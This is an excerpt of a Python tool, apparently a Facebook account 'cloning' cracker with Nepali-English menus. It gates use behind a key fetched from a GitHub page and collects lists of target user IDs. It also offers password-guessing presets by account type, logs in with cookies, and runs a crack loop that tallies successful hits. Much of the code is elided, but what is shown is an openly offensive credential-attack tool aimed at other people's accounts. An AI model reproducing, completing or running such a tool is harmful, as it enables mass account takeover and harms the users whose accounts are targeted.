...
[★]  AUTHOR :  NIKI⚔️BAU                   
➤➤----------- NIKI DON HERE-----------➤➤       
 NOTE : TAKE PERMISSION ADMIN TO USE THIS TOOL♥︎
\033[1;37m""")
...
def nameask():
    ...
    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
        ...
        print(" [\u001b[36m•\033[1;37m] AFNO NAME HALA")
        linex()
        uname = input(" [\u001b[36m•\033[1;37m] AFNO NAME HALA: ")
        linex()
        with open("data/name.xml", "w") as name_file_obj:
            name_file_obj.write(uname)
            print(" [\u001b[36m•\033[1;37m] NEXT STEP CONTINUE GARA ")
            exit()
try:
...
def contact():
	clear()
	banner()
	print(" [\u001b[36m1\033[1;37m] https://www.facebook.com/profile.php?id=61551443378124&mibextid=2JQ9oc")
	print(" [\u001b[36m2\033[1;37m] 61551443378124")
	linex()
	admin = input(" CHOOSE : ")
	if admin in ['1']:
		os.system('xdg-open https://www.facebook.com/profile.php?id=61551443378124&mibextid=2JQ9oc')
		back()
	elif admin in ['2']:
		linex()
		message = input(' [\u001b[36m•\033[1;37m] MESSAGE TYPE HANA : ')
		...
		linex()
		animation(" [\u001b[36m>\033[1;37m] MESSAGE ADMIN NERA GIYO")
		input(" [\u001b[36m>\033[1;37m] BACK HAN")
		back()
...
def approval():
  ...
  try:
    ...
    httpCaht = requests.get("https://github.com/NIKI-DON/NIKI-DON/tree/main").text
    ...
    if id in httpCaht:
      ...
      animation("\1b[1;97m >> Soriee SORRY TIMRO KEY APPROVE XAINA");
				...
				if 'How do you want to log into Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Success!' in str(response6):
							...
							linex()
							animation(f'\033[0m \u001b[36m>>\033[1;37m LOGO BHIYO CLONE HANA');exit()
			except Exception as e:
				linex()
				animation(f'\033[0m \u001b[36m>>\033[1;37m COOKIE GIYO ARKO HALA')
...
def menu(my_name,my_id):
	...
	clear()
	banner()
	print(" [\u001b[36m•\033[1;37m]  WELCOME VAI : "+uname)
	print(" [\u001b[36m•\033[1;37m] TODAYS DATE : "+date)
	linex()
	print(f""" [\u001b[36m1\033[1;37m] CRACK PUBLIC       [\u001b[36m4\033[1;37m] RESET NAME""")
	print(f""" [\u001b[36m2\033[1;37m] CRACK FILE         [\u001b[36m5\033[1;37m]    CHAT ADMIN""")
	print(f""" [\u001b[36m3\033[1;37m] CHECK RESULTS      [\u001b[36m0\033[1;37m] CLOSE MENU""")
	linex()
...
def dump_massal():
	...
	try:
		linex()
		jum = int(input(' [\u001b[36m•\033[1;37m] CLONE GARNA UID AMOUNT HALA  : '))
		linex()
	except ValueError:
		linex()
	...
	for met in range(jum):
		yz+=1
		kl = input(' [\u001b[36m•\033[1;37m] UID HALA '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		linex()
		print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[32m'+str(len(id))+'\033[1;37m')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
...
def setting():
	linex()
	print(" [\u001b[36m1\033[1;37m]. FREE FIRE IDZ")
	print(" [\u001b[36m1\033[1;37m]. TIK TOK IDZ")
	print(" [\u001b[36m1\033[1;37m]. OLD IDZ")
	print(" [\u001b[36m2\033[1;37m]  NEW IDZ")
	print(" [\u001b[36m3\033[1;37m]  ALL IDZ")
	linex()
...
def passwrd():
	...
	linex()
	print(f" \u001b[36m>> \033[1;37m️RAMRO NETWORK MA CLONE HANA")
	linex()
	...
	linex()
	woi = input(' \u001b[36m>>\033[1;37m TRY FOR NEXT ? (y/n) : ')
	if woi in ['y','Y']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[NIKI-DON]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
